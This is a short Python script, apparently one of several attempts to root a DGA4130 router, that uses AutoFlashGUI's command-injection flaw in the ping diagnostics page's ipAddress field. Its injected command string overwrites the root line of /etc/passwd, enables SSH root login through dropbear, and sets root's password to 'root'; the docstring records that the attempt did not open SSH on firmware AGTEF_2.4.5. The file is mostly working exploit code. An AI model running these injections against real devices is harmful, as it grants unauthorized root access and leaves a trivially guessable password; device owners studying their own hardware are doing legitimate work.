"""Attempt root via AutoFlashGUI's "Ping" command-injection variant
(ipAddress field, /modals/diagnostics-ping-modal.lp), using the shorter
DGA4130-specific command sequence from AutoFlashGUI's own defaults.ini
(written for AGTEF_1.0.3).

Result on AGTEF_2.4.5: same as the Advanced DDNS attempt -- commands sent
without a transport error, SSH never came up.
"""
from afg_inject_common import afg, HOST, USERNAME, PASSWORD

CMD = (
    "sed -i '1croot:x:0:0:root:/root:/bin/ash' /etc/passwd;"
    "uci set dropbear.@dropbear[0].RootPasswordAuth='on';"
    "uci set dropbear.@dropbear[0].enable='1';"
    "uci commit;"
    "echo -e \"root\\nroot\"|passwd;"
    "/etc/init.d/dropbear restart"
)

result = afg.mainScript(
    host=HOST,
    username=USERNAME,
    password=PASSWORD,
    flashFirmware=False,
    upgradeFilename="",
    flashSleepDelay=120,
    activeMethod="Ping",
    activeCommand=CMD,
    splitCommand=True,
    ddnsService="dyndns.com",
    connectRetryDelay=5,
    interCommandDelay=5,
)
print("RESULT:", result)
